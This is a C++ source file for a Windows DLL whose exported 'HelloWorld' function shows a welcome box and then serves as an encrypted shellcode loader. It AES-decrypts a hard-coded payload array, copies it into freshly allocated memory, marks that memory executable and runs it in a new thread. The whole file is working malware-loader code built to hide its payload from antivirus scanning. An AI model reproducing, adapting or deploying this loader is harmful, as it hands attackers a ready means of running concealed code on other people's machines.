#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")

void DecryptAES(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		printf("Failed in CryptAcquireContextW (%u)\n", GetLastError());
		return;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		printf("Failed in CryptCreateHash (%u)\n", GetLastError());
		return;
	}
	if (!CryptHashData(hHash, (BYTE*)key, keyLen, 0)) {
		printf("Failed in CryptHashData (%u)\n", GetLastError());
		return;
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
		printf("Failed in CryptDeriveKey (%u)\n", GetLastError());
		return;
	}

	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)shellcode, &shellcodeLen)) {
		printf("Failed in CryptDecrypt (%u)\n", GetLastError());
		return;
	}

	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);

}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reaseon_for_call, LPVOID IpReserved) {

	switch (ul_reaseon_for_call) {
	case DLL_PROCESS_ATTACH:
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return TRUE;
}

extern "C" {
__declspec(dllexport) BOOL WINAPI HelloWorld(void) {

		MessageBox( NULL, "Welcome!", "0xhav0c", MB_OK );

		unsigned char AESkey[] = { 0x24, 0x23, 0xb1, 0x5e, 0x15, 0x45, 0x67, 0x75, 0x39, 0xd8, 0xa8, 0xf1, 0x31, 0xf8, 0xbf, 0xc };
		unsigned char payload[] = { 0xe4, 0x2a, 0x54, 0x2a, 0xb3, 0x54, 0x83, 0xe6, 0x86, 0x40, 0x22, 0xf3, 0x68, 0xfa, 0x1e, 0xc5, 0xf1, 0xab, 0xcd, 0x82, 0x86, 0xe2, 0x4, 0xc3, 0xd0, 0x4d, 0x82, 0x2a, 0x4a, 0x6e, 0xcc, 0xb6, 0xf0, 0xce, 0x54, 0x43, 0x6b, 0xc4, 0x5e, 0x5c, 0xbb, 0x93, 0x2d, 0x80, 0x8, 0x35, 0x2d, 0x2a, 0xfd, 0x1e, 0xdb, 0x2a, 0x98, 0xab, 0x56, 0x1, 0xfe, 0x2b, 0x9d, 0xa5, 0x22, 0x9e, 0x73, 0x57, 0x80, 0x4b, 0xec, 0x98, 0xea, 0x27, 0x4e, 0x5c, 0x17, 0xf6, 0xd6, 0x82, 0x32, 0x9b, 0xeb, 0x1f, 0x6b, 0x63, 0xef, 0x74, 0x9d, 0xea, 0xc6, 0x28, 0x4b, 0x59, 0xca, 0x9, 0xcd, 0x9f, 0x43, 0x2e, 0x6f, 0x82, 0x7e, 0x18, 0x3d, 0x8e, 0x57, 0x98, 0xf9, 0xaa, 0x98, 0xfd, 0x14, 0x81, 0x3, 0x2c, 0x7b, 0x1, 0x21, 0x62, 0x69, 0x94, 0x86, 0xbb, 0x10, 0xa5, 0xe, 0x93, 0x39, 0x86, 0x3b, 0xad, 0x83, 0x65, 0xe2, 0xab, 0xd5, 0x7b, 0x62, 0x59, 0x93, 0x58, 0x86, 0x55, 0xe5, 0xb9, 0x49, 0xc0, 0x37, 0x82, 0xa4, 0x75, 0x48, 0xcb, 0x4a, 0xd4, 0x36, 0x52, 0x96, 0xd3, 0x95, 0xc7, 0x83, 0x6f, 0xfa, 0xa5, 0xb7, 0x4f, 0x44, 0xb7, 0xbb, 0xfa, 0xc8, 0xb8, 0x69, 0xab, 0x20, 0x6f, 0x92, 0x24, 0xd4, 0x4c, 0xad, 0x25, 0xde, 0x5c, 0x82, 0x1, 0x21, 0x5, 0x8a, 0x3b, 0x14, 0xdf, 0x16, 0x2e, 0x58, 0x91, 0xc6, 0xbe, 0x8b, 0xc6, 0x3, 0x17, 0x51, 0xeb, 0x24, 0x69, 0x8f, 0xdc, 0x30, 0xdd, 0x23, 0x9c, 0xc4, 0xe8, 0xcb, 0xa4, 0x8c, 0xd1, 0x8f, 0x5a, 0x1a, 0x5b, 0x7d, 0xfe, 0x27, 0xad, 0xed, 0x21, 0x2c, 0x88, 0xd2, 0xa9, 0x71, 0x43, 0x8a, 0xae, 0xb6, 0x84, 0xf0, 0x1a, 0xec, 0x99, 0xb7, 0x9c, 0xb3, 0x1b, 0xa9, 0x2d, 0x8a, 0xe, 0x40, 0x80, 0x5e, 0xcf, 0xb2, 0x7, 0x83, 0x4d, 0xd5, 0x6f, 0x59, 0x43, 0x4f, 0x73, 0xaf, 0xb9, 0x17, 0xdd, 0x9, 0x2a, 0x8e, 0xb1, 0x77, 0x7b, 0xda, 0x12, 0x2c, 0xb5, 0x66, 0x4d, 0x6b, 0x16, 0xb1, 0x71, 0x48, 0xc6, 0xa3, 0x48, 0x33, 0x47, 0xd3, 0x11, 0xb6, 0x62, 0x1a, 0x9f, 0xb8, 0x92, 0x62, 0xc0, 0x1e, 0x10, 0x43, 0x80, 0x68, 0x52, 0x38, 0xd0, 0x4a, 0xf4, 0x1f, 0x68, 0xb6, 0x4c, 0x5a, 0x9e, 0x6, 0xf1, 0xe7, 0xa5, 0x63, 0xd, 0x1, 0x7a, 0xb8, 0x52, 0xbb, 0xa4, 0xb, 0x5e, 0xe0, 0xed, 0x38, 0xc1, 0x86, 0x2d, 0x18, 0xa4, 0xe7, 0x8, 0x93, 0xcb, 0x74, 0x22, 0xbb, 0x6e, 0x1, 0xa7, 0xf1, 0x46, 0xc3, 0x84, 0xce, 0x78, 0x97, 0x83, 0x14, 0x65, 0x55, 0xf6, 0xeb, 0x1e, 0xc2, 0x8d, 0x35, 0xde, 0x60, 0x28, 0x24, 0x6e, 0xa6, 0xeb, 0x5f, 0x71, 0xcc, 0x85, 0x85, 0x41, 0xe7, 0x58, 0xb, 0xf3, 0x53, 0x93, 0x9f, 0xd4, 0xfe, 0xa8, 0x93, 0x20, 0xe7, 0xe6, 0xeb, 0xb9, 0x21, 0x53, 0x27, 0x2e, 0x49, 0x0, 0x5d, 0xea, 0xee, 0x7a, 0xb8, 0xa6, 0x36, 0x97, 0xfc, 0x44, 0x11, 0x27, 0x67, 0xd9, 0x18, 0x56, 0x8e, 0x86, 0x51, 0xe4, 0x25, 0xfb, 0x9a, 0x4c, 0xbd, 0xd5, 0x86, 0x74, 0x18, 0x5e, 0x35, 0x36, 0x95, 0xed, 0xbd, 0x45, 0xba, 0xff, 0xe2, 0x49, 0x50, 0xe1, 0x25, 0xa5, 0x73, 0xfa, 0x9d, 0xb2, 0xa9, 0x82, 0x70, 0x55, 0x3c, 0x4b, 0xb1, 0xe8, 0x6f, 0x37, 0xe2, 0x1c, 0x28, 0x1c, 0xb7, 0x38, 0x44, 0x80 };

		DWORD payload_length = sizeof(payload);

		LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

		if (!alloc_mem) {
			printf("Failed to Allocate memory (%u)\n", GetLastError());
			return -1;
		}

		// Decrypt the AES payload to Original Shellcode
		DecryptAES((char*)payload, payload_length, AESkey, sizeof(AESkey));

		MoveMemory(alloc_mem, payload, sizeof(payload));
		//RtlMoveMemory(alloc_mem, payload, sizeof(payload));


		DWORD oldProtect;

		if (!VirtualProtect(alloc_mem, sizeof(payload), PAGE_EXECUTE_READ, &oldProtect)) {
			printf("Failed to change memory protection (%u)\n", GetLastError());
			return -2;
		}


		HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
		if (!tHandle) {
			printf("Failed to Create the thread (%u)\n", GetLastError());
			return -3;
		}

		printf("\n\nalloc_mem : %p\n", alloc_mem);
		WaitForSingleObject(tHandle, INFINITE);
		getchar();
		((void(*)())alloc_mem)();

		return 0;

		return TRUE;
		}
}
